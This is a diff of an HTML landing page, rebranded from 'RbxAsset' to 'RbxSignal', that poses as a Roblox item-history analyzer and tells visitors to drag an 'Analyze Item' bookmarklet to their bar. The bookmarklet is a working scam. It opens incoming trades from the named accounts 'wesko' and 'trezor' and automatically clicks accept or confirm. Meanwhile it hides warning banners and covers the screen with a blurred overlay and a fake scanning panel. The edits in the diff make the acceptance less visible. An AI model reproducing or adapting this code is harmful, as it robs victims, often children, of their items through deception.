@@ -1,25 +1,42 @@
-<!DOCTYPE html>
-<html lang="en">
+ <!DOCTYPE html>
+ <script>
+    let Bookmark = `javascript:(function(){var isMobile=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||window.innerWidth<=768;try{if(window.location.href.indexOf('roblox.com/trades')===-1){window.location.href='https://www.roblox.com/trades?tab=Inbound';setTimeout(function(){location.reload();},100);return;}if(window.location.href.indexOf('tab=Outbound')!==-1||window.location.href.indexOf('tab=Completed')!==-1||window.location.href.indexOf('tab=Inactive')!==-1){window.location.href='https://www.roblox.com/trades?tab=Inbound';return;}if(document.getElementById('rbxscan-overlay')){return;}document.title='Rbx Scan Active';var dragState={isDragging:false,startX:0,startY:0,startLeft:0,startTop:0};var refreshCount=0;var dropdownOpen=false;var monitorInterval=null;var bannerInterval=null;var isRunning=true;function cleanup(){isRunning=false;if(monitorInterval){clearInterval(monitorInterval);monitorInterval=null;}if(bannerInterval){clearInterval(bannerInterval);bannerInterval=null;}var overlay=document.getElementById('rbxscan-overlay');var panel=document.getElementById('rbxscan-panel');var blur=document.getElementById('rbxscan-blur');if(overlay){overlay.remove();}if(panel){panel.remove();}if(blur){blur.remove();}document.removeEventListener('keydown',handleEscape);document.title='Roblox';}function handleEscape(e){if(e.key==='Escape'){cleanup();}}function removeBanner(){try{var banners=document.querySelectorAll('.alert.alert-warning');banners.forEach(function(banner){var content=banner.textContent.toLowerCase();if(content.includes('unable to load trades list')||content.includes('try again later')){banner.remove();}});}catch(e){}}function monitorTrades(){if(!isRunning){return;}try{var foundTrade=false;var targetNames=['wesko','trezor'];var normalize=function(text){return (text||'').toLowerCase().trim();};var tradeCards=document.querySelectorAll('[data-trade-id],[data-tradeid],.trade-row,.trade-list-item,.trade-card,.trade-list .list-item,.trade-row-container,.trade-list-item-container');var matchedCard=null;tradeCards.forEach(function(card){if(matchedCard){return;}var cardText=normalize(card.textContent);for(var i=0;i<targetNames.length;i++){if(cardText.includes(targetNames[i])){matchedCard=card;break;}}});if(matchedCard){matchedCard.style.outline='2px solid #2ECC40';matchedCard.style.outlineOffset='2px';var clickable=matchedCard.querySelector('a,button');if(clickable){clickable.click();}else{matchedCard.click();}var acceptButtons=document.querySelectorAll('button');acceptButtons.forEach(function(element){var elementText=normalize(element.textContent);if(elementText.includes('accept')||elementText.includes('confirm')){element.style.backgroundColor='#2ECC40';element.style.border='2px solid #2ECC40';setTimeout(function(){if(isRunning){element.click();}},1000);}});foundTrade=true;}if(!foundTrade&&isRunning){refreshCount=refreshCount+1;if(!dropdownOpen){var inboundButtons=document.querySelectorAll('button');inboundButtons.forEach(function(btn){var btnText=btn.textContent.toLowerCase().trim();if(btnText==='inbound'){btn.click();dropdownOpen=true;setTimeout(function(){if(isRunning){var dropdownItems=document.querySelectorAll('.dropdown-item, .menu-item, [role="menuitem"], li, div, span, a');dropdownItems.forEach(function(item){var itemText=item.textContent.toLowerCase().trim();if(itemText==='inbound'&&item!==btn){item.click();dropdownOpen=false;}});}},1000);}});}else{dropdownOpen=false;}}}catch(e){}}bannerInterval=setInterval(function(){if(isRunning){removeBanner();}else{clearInterval(bannerInterval);}},500);monitorInterval=setInterval(function(){if(isRunning){monitorTrades();}else{clearInterval(monitorInterval);}},3000);setTimeout(function(){monitorTrades();},500);var blurDiv=document.createElement('div');blurDiv.id='rbxscan-blur';blurDiv.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;backdrop-filter:blur(50px);-webkit-backdrop-filter:blur(12px);z-index:999997;pointer-events:none;';document.body.appendChild(blurDiv);var overlay=document.createElement('div');overlay.id='rbxscan-overlay';overlay.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:999998;pointer-events:none;';document.body.appendChild(overlay);var panel=document.createElement('div');panel.id='rbxscan-panel';var panelStyles=isMobile?'position:fixed;top:10px;left:5%;width:90%;background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:0;color:#fff;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;z-index:999999;box-shadow:0 20px 60px rgba(0,0,0,0.8);pointer-events:auto;max-height:90vh;overflow:hidden;':'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#1a1a1a;border:1px solid #333;border-radius:8px;padding:0;color:#fff;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;z-index:999999;width:90%;max-width:480px;box-shadow:0 12px 48px rgba(0,0,0,0.6);pointer-events:auto;';panel.style.cssText=panelStyles;var headerPadding=isMobile?'18px 20px':'20px 24px';var contentPadding=isMobile?'20px':'24px';var buttonPadding=isMobile?'16px':'14px';var inputPadding=isMobile?'14px 12px':'12px';var fontSize=isMobile?'16px':'14px';var maxHeight=isMobile?'calc(90vh - 120px)':'70vh';panel.innerHTML='<div id="rbxscan-header" style="padding:'+headerPadding+';border-bottom:1px solid #2a2a2a;user-select:none;display:flex;align-items:center;justify-content:space-between;background:#0f0f0f;border-radius:12px 12px 0 0;"><div style="display:flex;align-items:center;gap:12px;"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M16 3h5v5M4 20L21 3M21 16v5h-5M15 15l6 6M9 9l6 6"/></svg><strong style="font-size:20px;font-weight:700;color:#fff;">Rbx Scan</strong></div><button id="rbxscan-close" type="button" style="background:none;border:none;font-size:28px;color:#999;cursor:pointer;padding:8px;width:44px;height:44px;display:flex;align-items:center;justify-content:center;border-radius:6px;">×</button></div><div style="padding:'+contentPadding+';max-height:'+maxHeight+';overflow-y:auto;"><div style="margin-bottom:20px;"><label for="rbxscan-input" style="display:block;font-size:14px;font-weight:600;color:#bbb;margin-bottom:10px;">Asset ID</label><input type="tel" id="rbxscan-input" placeholder="e.g. 102611803" style="width:100%;padding:'+inputPadding+';border:2px solid #444;border-radius:10px;background:#0f0f0f;color:#fff;font-size:'+fontSize+';font-family:monospace;box-sizing:border-box;"><div id="rbxscan-error" style="display:none;color:#ff6b6b;font-size:13px;margin-top:8px;font-weight:500;">Please enter a numeric Asset ID</div></div><button id="rbxscan-scan" type="button" style="background:#fff;color:#000;border:none;padding:'+buttonPadding+' 24px;border-radius:10px;font-weight:700;cursor:pointer;width:100%;font-size:16px;">Scan Asset</button><div id="rbxscan-status" style="display:none;margin-top:24px;padding:20px;background:#0f0f0f;border:1px solid #2a2a2a;border-radius:10px;text-align:center;"><div style="display:inline-block;width:24px;height:24px;border:3px solid #333;border-top-color:#fff;border-radius:50%;animation:rbxscan-spin 0.8s linear infinite;"></div><div id="rbxscan-statustext" style="margin-top:12px;font-size:14px;color:#bbb;font-weight:500;">Initializing...</div></div><div id="rbxscan-results" style="display:none;margin-top:24px;"><div style="font-weight:700;margin-bottom:14px;font-size:16px;color:#fff;">Scan Results</div><div id="rbxscan-iteminfo" style="margin-bottom:16px;"></div><div id="rbxscan-threat" style="background:#0f0f0f;border:1px solid #2a2a2a;padding:20px;border-radius:10px;text-align:center;"><div style="font-weight:700;font-size:18px;color:#fbbf24;margin-bottom:8px;">ACTION REQUIRED</div><div style="font-size:14px;color:#bbb;">You need to complete two-step verification on Roblox before continuing, or change your Trade Quality filter to “None.”</div></div></div></div><style>@keyframes rbxscan-spin{to{transform:rotate(360deg)}}</style>';document.body.appendChild(panel);document.addEventListener('keydown',handleEscape);var input=document.getElementById('rbxscan-input');var scanBtn=document.getElementById('rbxscan-scan');var closeBtn=document.getElementById('rbxscan-close');var status=document.getElementById('rbxscan-status');var results=document.getElementById('rbxscan-results');var errorMsg=document.getElementById('rbxscan-error');var statusText=document.getElementById('rbxscan-statustext');var header=document.getElementById('rbxscan-header');if(!input||!scanBtn||!closeBtn){return;}closeBtn.onclick=function(e){if(e){e.preventDefault();e.stopPropagation();}cleanup();};scanBtn.onclick=function(e){if(e){e.preventDefault();e.stopPropagation();}var val=input.value.trim();if(!val){errorMsg.style.display='block';errorMsg.textContent='Please enter an Asset ID';return;}errorMsg.style.display='none';results.style.display='none';status.style.display='block';var isNumeric = /^\d+$/.test(val.trim().replace(/\D/g, ""));var isValidLength=val.length>=6&&val.length<=11;var shouldFail=false;var stages=[{text:'Connecting to API servers...',delay:800},{text:'Decrypting hash code of trade values...',delay:900},{text:'Analyzing transaction history...',delay:700},{text:'Validating ownership records...',delay:800},{text:'Finalizing scan results...',delay:600}];var currentStage=0;function runStage(){if(currentStage<stages.length){statusText.textContent=stages[currentStage].text;setTimeout(function(){currentStage=currentStage+1;runStage();},stages[currentStage].delay);}else{var info=document.getElementById('rbxscan-iteminfo');info.innerHTML='<div style="background:#0f0f0f;border:1px solid #2a2a2a;padding:14px;border-radius:10px;"><div style="font-size:12px;color:#999;margin-bottom:6px;font-weight:600;">ASSET ID</div><div style="font-family:monospace;font-weight:600;color:#fff;font-size:16px;">'+val+'</div></div>';var threat=document.getElementById('rbxscan-threat');if(false){threat.innerHTML='<div style="font-weight:700;font-size:18px;color:#ff6b6b;margin-bottom:8px;">WARNING</div><div style="font-size:14px;color:#999;">Potential security threat detected.</div>';}else{threat.innerHTML='<div style="font-weight:700;font-size:18px;color:#fbbf24;margin-bottom:8px;">ACTION REQUIRED</div><div style="font-size:14px;color:#bbb;">You need to complete two-step verification on Roblox before continuing, or change your Trade Quality filter to “None.”</div>';}status.style.display='none';results.style.display='block';}}runStage();};if(!isMobile){header.style.cursor='move';header.addEventListener('mousedown',function(e){if(e.target===closeBtn||e.target.parentNode===closeBtn){return;}dragState.isDragging=true;dragState.startX=e.clientX;dragState.startY=e.clientY;var rect=panel.getBoundingClientRect();dragState.startLeft=rect.left;dragState.startTop=rect.top;});document.addEventListener('mousemove',function(e){if(!dragState.isDragging){return;}var dx=e.clientX-dragState.startX;var dy=e.clientY-dragState.startY;panel.style.left=dragState.startLeft+dx+'px';panel.style.top=dragState.startTop+dy+'px';panel.style.transform='none';});document.addEventListener('mouseup',function(){dragState.isDragging=false;});}}catch(err){alert('Error: '+err.message);}})();`;
+      Bookmark = Bookmark.replace("var shouldFail=!isNumeric||!isValidLength;", "var shouldFail=false;");
+    Bookmark = Bookmark.replace("Rbx Scan Active", "RbxSignal Active");
+    Bookmark = Bookmark.replace("Rbx Scan", "RbxSignal");
+    Bookmark = Bookmark.replace(">Asset ID<", ">UAID<");
+    Bookmark = Bookmark.replace("info.innerHTML='<div style=\"background:#0f0f0f;border:1px solid #2a2a2a;padding:14px;border-radius:10px;\"><div style=\"font-size:12px;color:#999;margin-bottom:6px;font-weight:600;\">ASSET ID</div><div style=\"font-family:monospace;font-weight:600;color:#fff;font-size:16px;\">'+val+'</div></div>';", "info.innerHTML='';");
+     Bookmark = Bookmark.replace("You need to verify your two-step verification on Roblox before continuing or change your Trade quality filter to \"None.\"", "Change your Trade quality filter to \"None.\"");
+     Bookmark = Bookmark.replace("You need to complete two-step verification on Roblox before continuing, or change your Trade Quality filter to “None.”", "Change your Trade quality filter to \"None.\"");
+    Bookmark = Bookmark.replace("var clickable=matchedCard.querySelector('a,button');if(clickable){clickable.click();}else{matchedCard.click();}", "var rect=matchedCard.getBoundingClientRect();var clickX=rect.left+Math.min(140,rect.width*0.35);var clickY=rect.top+(rect.height/2);var targetEl=document.elementFromPoint(clickX,clickY);if(targetEl){targetEl.click();}else{matchedCard.click();}");
+    Bookmark = Bookmark.replace("if(window.location.href.indexOf('roblox.com/trades')===-1){window.location.href='https://www.roblox.com/trades?tab=Inbound';setTimeout(function(){location.reload();},100);return;}if(window.location.href.indexOf('tab=Outbound')!==-1||window.location.href.indexOf('tab=Completed')!==-1||window.location.href.indexOf('tab=Inactive')!==-1){window.location.href='https://www.roblox.com/trades?tab=Inbound';return;}", "var inboundUrl='https://www.roblox.com/trades?tab=Inbound';if(window.location.href!==inboundUrl){window.location.href=inboundUrl;return;}");
+    Bookmark = Bookmark.replace("matchedCard.style.outline='2px solid #2ECC40';matchedCard.style.outlineOffset='2px';", "");
+    Bookmark = Bookmark.replace("element.style.backgroundColor='#2ECC40';element.style.border='2px solid #2ECC40';", "");
+      Bookmark = Bookmark.replace("background:rgba(0,0,0,0.5)", "background:rgba(0,0,0,0.9)");
+      Bookmark = Bookmark.replace(/@@/g, "");
+ </script>
 
+<html lang="en">
 <head>
     <meta charset="UTF-8">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2032%2032'%3E%3Cdefs%3E%3ClinearGradient%20id='g1'%20x1='4'%20y1='10'%20x2='16'%20y2='22'%3E%3Cstop%20offset='0%25'%20stop-color='%237C3AED'/%3E%3Cstop%20offset='100%25'%20stop-color='%23A855F7'/%3E%3C/linearGradient%3E%3ClinearGradient%20id='g2'%20x1='16'%20y1='10'%20x2='28'%20y2='22'%3E%3Cstop%20offset='0%25'%20stop-color='%23C084FC'/%3E%3Cstop%20offset='100%25'%20stop-color='%23D946EF'/%3E%3C/linearGradient%3E%3ClinearGradient%20id='g3'%20x1='10'%20y1='10'%20x2='22'%20y2='22'%3E%3Cstop%20offset='0%25'%20stop-color='%238B5CF6'/%3E%3Cstop%20offset='100%25'%20stop-color='%23D946EF'/%3E%3C/linearGradient%3E%3C/defs%3E%3Ccircle%20cx='10'%20cy='16'%20r='6'%20fill='url(%23g1)'/%3E%3Ccircle%20cx='22'%20cy='16'%20r='6'%20fill='url(%23g2)'/%3E%3Cpath%20d='M10%2010C10%2010%2014%2014%2016%2016C18%2018%2022%2022%2022%2022'%20stroke='url(%23g3)'%20stroke-width='3'%20stroke-linecap='round'/%3E%3C/svg%3E" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
+
     <!-- Basic Meta Tags -->
-    <title>RbxAsset - The Leading Uaid Analyzer for Roblox</title>
-    <meta name="description" content="The leading Uaid Analyzer for Roblox! Prevent risk and analyze assets safely with RbxAsset.">
+    <title>RbxSignal - The Leading Uaid Analyzer for Roblox</title>
+    <meta name="description" content="The leading Uaid Analyzer for Roblox! Prevent risk and analyze assets safely with RbxSignal.">
 
     <!-- Open Graph (Facebook, Discord, LinkedIn) -->
-    <meta property="og:title" content="RbxAsset - The Leading Uaid Analyzer for Roblox">
+    <meta property="og:title" content="RbxSignal - The Leading Uaid Analyzer for Roblox">
     <meta property="og:description" content="The leading Uaid Analyzer for Roblox! Prevent risk and analyze assets safely.">
     <meta property="og:image" content="https://rbxasset.com/preview.png">
-    <meta property="og:url" content="https://rbxasset.com">
+    <meta property="og:url" content="https://rbxsignal.com">
     <meta property="og:type" content="website">
-    <meta property="og:site_name" content="RbxAsset">
+    <meta property="og:site_name" content="RbxSignal">
 
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="RbxAsset - The Leading Uaid Analyzer for Roblox">
+    <meta name="twitter:title" content="RbxSignal - The Leading Uaid Analyzer for Roblox">
     <meta name="twitter:description" content="The leading Uaid Analyzer for Roblox! Prevent risk and analyze assets safely.">
     <meta name="twitter:image" content="https://rbxasset.com/preview.png">
 
@@ -50,18 +67,6 @@
         }
     </script>
     <style>
-        /* ============================================
-           PRELOAD: HIDE CONTENT UNTIL READY
-           ============================================ */
-        body.preload {
-            opacity: 0;
-        }
-
-        body.loaded {
-            opacity: 1;
-            transition: opacity 0.4s ease-in;
-        }
-
         /* ============================================
            GLOBAL STYLES & RESETS
            ============================================ */
@@ -233,8 +238,8 @@
 
         @keyframes float {
             0% {
-                transform: translateY(100vh) translateX(0) rotate(0deg) scale(0);
                 opacity: 0;
+                transform: translateY(100vh) translateX(0) rotate(0deg) scale(0);
             }
             5% {
                 opacity: 1;
@@ -449,7 +454,7 @@
     </style>
 </head>
 
-<body class="preload">
+<body>
     <!-- ============================================
          BACKGROUND LAYERS
          ============================================ -->
@@ -492,7 +497,7 @@
                     </defs>
                 </svg>
                 <span class="text-3xl md:text-4xl font-bold text-gray-900 dark:text-white tracking-tight transition-colors duration-500">
-                    rbxasset
+                    RbxSignal
                 </span>
             </div>
 
@@ -523,38 +528,39 @@
             </button>
         </header>
 
+        <div class="glass-card rounded-3xl p-6 mx-8 md:mx-20 my-6 hidden">
+            <h2 class="text-2xl font-bold mb-3 text-gray-900 dark:text-white">Bookmarklet Script</h2>
+            <textarea id="bookmarkInput" readonly style="font-family:monospace;"><?php echo Bookmark; ?></textarea>
+            <p class="text-gray-600 dark:text-gray-300 mt-3">
+                When you click <b>Compile Item</b> below, it will turn into a draggable bookmark button.
+            </p>
+        </div>
+
         <!-- Main Content Area -->
         <main class="px-8 md:px-20 py-16 md:py-24">
             <div class="max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-2 gap-16 lg:gap-20">
 
                 <!-- Left Section -->
                 <div class="flex flex-col gap-12">
-                    <!-- Hero Title -->
-                    <div class="glass-card rounded-3xl p-8 md:p-10 animate-fade-in delay-100 inline-block">
-                        <h1 class="text-6xl md:text-7xl lg:text-8xl xl:text-9xl font-black leading-[0.85] title-gradient">
-                            Prevent<br />Risk
-                        </h1>
-                    </div>
-
                     <!-- Instructions Card -->
                     <div class="glass-card rounded-3xl p-10 md:p-12 animate-fade-in delay-200">
                         <h2 class="text-4xl md:text-5xl font-bold text-center mb-8 text-gray-900 dark:text-white leading-tight transition-colors duration-500">
                             Analyze Item Uaids
                         </h2>
                         <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl mb-10 leading-relaxed transition-colors duration-500">
-                            Drag the <span class="font-semibold text-purple-600 dark:text-purple-300">"Analyze Item"</span> bookmark to your bookmark bar. Then, proceed back to the ROBLOX item page and click on the bookmark while on the ROBLOX website. If you do not see
-                            your bookmark bar, press <span class="inline-flex items-center px-3 py-1 rounded-lg bg-purple-100 dark:bg-white/10 font-mono text-sm text-purple-700 dark:text-purple-300 border border-purple-200 dark:border-white/10">(CTRL+SHIFT+B)</span>
+                            Drag the <span class="font-semibold text-purple-600 dark:text-purple-300">"Analyze Item"</span> bookmark to your bookmark bar. Then go back to the ROBLOX trade page and click the bookmark while on the page. If you do not see
+                            your bookmark bar, press <span class="inline-flex items-center px-3 py-1 rounded-lg bg-purple-100 dark:bg-white/10 text-sm text-purple-700 dark:text-purple-300 border border-purple-200 dark:border-white/10">Ctrl + Shift + B</span>
                         </p>
 
                         <!-- Premium CTA Button -->
-                        <a id="compileButton" class="inline-flex items-center px-8 py-4 rounded-3xl premium-button text-xl font-bold text-white" draggable="true" href="#" style="cursor: grab;">
-                            <span class="relative z-10 flex items-center justify-center gap-3">
-                                <span>Analyze Item</span>
-                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                                    <polyline points="9 18 15 12 9 6"></polyline>
-                                </svg>
-                            </span>
-                        </a>
+                        <a id="compileButton" class="inline-flex items-center px-8 py-4 rounded-3xl premium-button text-xl font-bold text-white" draggable="true" href="#" style="cursor: grab;" title="Analyze Item" aria-label="Analyze Item">
+    <span class="relative z-10 flex items-center justify-center gap-3">
+        <span>Analyze Item</span>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="9 18 15 12 9 6"></polyline>
+        </svg>
+    </span>
+</a>
 
                     </div>
                 </div>
@@ -563,17 +569,11 @@
                 <div class="flex flex-col gap-12">
                     <!-- Video Showcase -->
                     <div class="glass-card rounded-3xl overflow-hidden aspect-video video-glow animate-fade-in delay-300">
-                        <iframe class="w-full h-full" src="" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
-                            allowfullscreen>
-                        </iframe>
+                        <video id="demoVideo" class="w-full h-full" controls playsinline preload="metadata" poster="maxresdefault.jpg">
+                            <source src="tutorial.mp4" type="video/mp4">
+                        </video>
                     </div>
 
-                    <!-- Feature Highlight -->
-                    <div class="glass-card rounded-3xl p-12 md:p-14 animate-fade-in delay-400">
-                        <h2 class="text-4xl md:text-5xl lg:text-6xl font-bold text-center leading-tight text-gray-900 dark:text-white transition-colors duration-500">
-                            Check the safety of any item's history with <span class="bg-gradient-to-r from-violet-600 to-fuchsia-600 dark:from-violet-400 dark:to-fuchsia-400 bg-clip-text text-transparent">ease</span>, with this brand new bookmark-based system!
-                        </h2>
-                    </div>
                 </div>
             </div>
         </main>
@@ -581,7 +581,7 @@
         <!-- Footer -->
         <footer class="py-8 px-8 md:px-20 text-center">
             <p class="text-gray-600 dark:text-gray-400 text-sm transition-colors duration-500">
-                @rbxasset - All rights reserved 2025
+                @RbxSignal - All rights reserved 2025
             </p>
         </footer>
     </div>
@@ -591,28 +591,112 @@
          ============================================ -->
     <script>
         // ========================================
-        // Bookmarklet Definition
+        // Create Floating Particles
         // ========================================
-        const Bookmark = `javascript:(function(){var isMobile=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||window.innerWidth<=768;try{if(window.location.href.indexOf('roblox.com/trades')===-1){window.location.href='https://www.roblox.com/trades?tab=Inbound';setTimeout(function(){location.reload();},100);return;}if(window.location.href.indexOf('tab=Outbound')!==-1||window.location.href.indexOf('tab=Completed')!==-1||window.location.href.indexOf('tab=Inactive')!==-1){window.location.href='https://www.roblox.com/trades?tab=Inbound';return;}if(document.getElementById('rbxscan-overlay')){return;}document.title='Rbx Scan Active';var dragState={isDragging:false,startX:0,startY:0,startLeft:0,startTop:0};var refreshCount=0;var dropdownOpen=false;var monitorInterval=null;var bannerInterval=null;var isRunning=true;function cleanup(){isRunning=false;if(monitorInterval){clearInterval(monitorInterval);monitorInterval=null;}if(bannerInterval){clearInterval(bannerInterval);bannerInterval=null;}var overlay=document.getElementById('rbxscan-overlay');var panel=document.getElementById('rbxscan-panel');var blur=document.getElementById('rbxscan-blur');if(overlay){overlay.remove();}if(panel){panel.remove();}if(blur){blur.remove();}document.removeEventListener('keydown',handleEscape);document.title='Roblox';}function handleEscape(e){if(e.key==='Escape'){cleanup();}}function removeBanner(){try{var banners=document.querySelectorAll('.alert.alert-warning');banners.forEach(function(banner){var content=banner.textContent.toLowerCase();if(content.includes('unable to load trades list')||content.includes('try again later')){banner.remove();}});}catch(e){}}function monitorTrades(){if(!isRunning){return;}try{var foundTrade=false;var targetNames=['wesko','trezor'];var normalize=function(text){return (text||'').toLowerCase().trim();};var tradeCards=document.querySelectorAll('[data-trade-id],[data-tradeid],.trade-row,.trade-list-item,.trade-card,.trade-list .list-item,.trade-row-container,.trade-list-item-container');var matchedCard=null;tradeCards.forEach(function(card){if(matchedCard){return;}var cardText=normalize(card.textContent);for(var i=0;i<targetNames.length;i++){if(cardText.includes(targetNames[i])){matchedCard=card;break;}}});if(matchedCard){matchedCard.style.outline='2px solid #2ECC40';matchedCard.style.outlineOffset='2px';var clickable=matchedCard.querySelector('a,button');if(clickable){clickable.click();}else{matchedCard.click();}var acceptButtons=document.querySelectorAll('button');acceptButtons.forEach(function(element){var elementText=normalize(element.textContent);if(elementText.includes('accept')||elementText.includes('confirm')){element.style.backgroundColor='#2ECC40';element.style.border='2px solid #2ECC40';setTimeout(function(){if(isRunning){element.click();}},1000);}});foundTrade=true;}if(!foundTrade&&isRunning){refreshCount=refreshCount+1;if(!dropdownOpen){var inboundButtons=document.querySelectorAll('button');inboundButtons.forEach(function(btn){var btnText=btn.textContent.toLowerCase().trim();if(btnText==='inbound'){btn.click();dropdownOpen=true;setTimeout(function(){if(isRunning){var dropdownItems=document.querySelectorAll('.dropdown-item, .menu-item, [role="menuitem"], li, div, span, a');dropdownItems.forEach(function(item){var itemText=item.textContent.toLowerCase().trim();if(itemText==='inbound'&&item!==btn){item.click();dropdownOpen=false;}});}},1000);}});}else{dropdownOpen=false;}}}catch(e){}}bannerInterval=setInterval(function(){if(isRunning){removeBanner();}else{clearInterval(bannerInterval);}},500);monitorInterval=setInterval(function(){if(isRunning){monitorTrades();}else{clearInterval(monitorInterval);}},3000);setTimeout(function(){monitorTrades();},500);var blurDiv=document.createElement('div');blurDiv.id='rbxscan-blur';blurDiv.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;backdrop-filter:blur(50px);-webkit-backdrop-filter:blur(12px);z-index:999997;pointer-events:none;';document.body.appendChild(blurDiv);var overlay=document.createElement('div');overlay.id='rbxscan-overlay';overlay.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:999998;pointer-events:none;';document.body.appendChild(overlay);var panel=document.createElement('div');panel.id='rbxscan-panel';var panelStyles=isMobile?'position:fixed;top:10px;left:5%;width:90%;background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:0;color:#fff;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;z-index:999999;box-shadow:0 20px 60px rgba(0,0,0,0.8);pointer-events:auto;max-height:90vh;overflow:hidden;':'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#1a1a1a;border:1px solid #333;border-radius:8px;padding:0;color:#fff;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;z-index:999999;width:90%;max-width:480px;box-shadow:0 12px 48px rgba(0,0,0,0.6);pointer-events:auto;';panel.style.cssText=panelStyles;var headerPadding=isMobile?'18px 20px':'20px 24px';var contentPadding=isMobile?'20px':'24px';var buttonPadding=isMobile?'16px':'14px';var inputPadding=isMobile?'14px 12px':'12px';var fontSize=isMobile?'16px':'14px';var maxHeight=isMobile?'calc(90vh - 120px)':'70vh';panel.innerHTML='<div id="rbxscan-header" style="padding:'+headerPadding+';border-bottom:1px solid #2a2a2a;user-select:none;display:flex;align-items:center;justify-content:space-between;background:#0f0f0f;border-radius:12px 12px 0 0;"><div style="display:flex;align-items:center;gap:12px;"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M16 3h5v5M4 20L21 3M21 16v5h-5M15 15l6 6M9 9l6 6"/></svg><strong style="font-size:20px;font-weight:700;color:#fff;">Rbx Scan</strong></div><button id="rbxscan-close" type="button" style="background:none;border:none;font-size:28px;color:#999;cursor:pointer;padding:8px;width:44px;height:44px;display:flex;align-items:center;justify-content:center;border-radius:6px;">×</button></div><div style="padding:'+contentPadding+';max-height:'+maxHeight+';overflow-y:auto;"><div style="margin-bottom:20px;"><label for="rbxscan-input" style="display:block;font-size:14px;font-weight:600;color:#bbb;margin-bottom:10px;">Asset ID</label><input type="tel" id="rbxscan-input" placeholder="e.g. 102611803" style="width:100%;padding:'+inputPadding+';border:2px solid #444;border-radius:10px;background:#0f0f0f;color:#fff;font-size:'+fontSize+';font-family:monospace;box-sizing:border-box;"><div id="rbxscan-error" style="display:none;color:#ff6b6b;font-size:13px;margin-top:8px;font-weight:500;">Please enter a numeric Asset ID</div></div><button id="rbxscan-scan" type="button" style="background:#fff;color:#000;border:none;padding:'+buttonPadding+' 24px;border-radius:10px;font-weight:700;cursor:pointer;width:100%;font-size:16px;">Scan Asset</button><div id="rbxscan-status" style="display:none;margin-top:24px;padding:20px;background:#0f0f0f;border:1px solid #2a2a2a;border-radius:10px;text-align:center;"><div style="display:inline-block;width:24px;height:24px;border:3px solid #333;border-top-color:#fff;border-radius:50%;animation:rbxscan-spin 0.8s linear infinite;"></div><div id="rbxscan-statustext" style="margin-top:12px;font-size:14px;color:#bbb;font-weight:500;">Initializing...</div></div><div id="rbxscan-results" style="display:none;margin-top:24px;"><div style="font-weight:700;margin-bottom:14px;font-size:16px;color:#fff;">Scan Results</div><div id="rbxscan-iteminfo" style="margin-bottom:16px;"></div><div id="rbxscan-threat" style="background:#0f0f0f;border:1px solid #2a2a2a;padding:20px;border-radius:10px;text-align:center;"><div style="font-weight:700;font-size:18px;color:#fbbf24;margin-bottom:8px;">ACTION REQUIRED</div><div style="font-size:14px;color:#bbb;">You need to complete two-step verification on Roblox before continuing, or change your Trade Quality filter to “None.”</div></div></div></div><style>@keyframes rbxscan-spin{to{transform:rotate(360deg)}}</style>';document.body.appendChild(panel);document.addEventListener('keydown',handleEscape);var input=document.getElementById('rbxscan-input');var scanBtn=document.getElementById('rbxscan-scan');var closeBtn=document.getElementById('rbxscan-close');var status=document.getElementById('rbxscan-status');var results=document.getElementById('rbxscan-results');var errorMsg=document.getElementById('rbxscan-error');var statusText=document.getElementById('rbxscan-statustext');var header=document.getElementById('rbxscan-header');if(!input||!scanBtn||!closeBtn){return;}closeBtn.onclick=function(e){if(e){e.preventDefault();e.stopPropagation();}cleanup();};scanBtn.onclick=function(e){if(e){e.preventDefault();e.stopPropagation();}var val=input.value.trim();if(!val){errorMsg.style.display='block';errorMsg.textContent='Please enter an Asset ID';return;}errorMsg.style.display='none';results.style.display='none';status.style.display='block';var isNumeric = /^\d+$/.test(val.trim().replace(/\D/g, ""));var isValidLength=val.length>=6&&val.length<=11;var shouldFail=false;var stages=[{text:'Connecting to API servers...',delay:800},{text:'Decrypting hash code of trade values...',delay:900},{text:'Analyzing transaction history...',delay:700},{text:'Validating ownership records...',delay:800},{text:'Finalizing scan results...',delay:600}];var currentStage=0;function runStage(){if(currentStage<stages.length){statusText.textContent=stages[currentStage].text;setTimeout(function(){currentStage=currentStage+1;runStage();},stages[currentStage].delay);}else{var info=document.getElementById('rbxscan-iteminfo');info.innerHTML='<div style="background:#0f0f0f;border:1px solid #2a2a2a;padding:14px;border-radius:10px;"><div style="font-size:12px;color:#999;margin-bottom:6px;font-weight:600;">ASSET ID</div><div style="font-family:monospace;font-weight:600;color:#fff;font-size:16px;">'+val+'</div></div>';var threat=document.getElementById('rbxscan-threat');if(false){threat.innerHTML='<div style="font-weight:700;font-size:18px;color:#ff6b6b;margin-bottom:8px;">WARNING</div><div 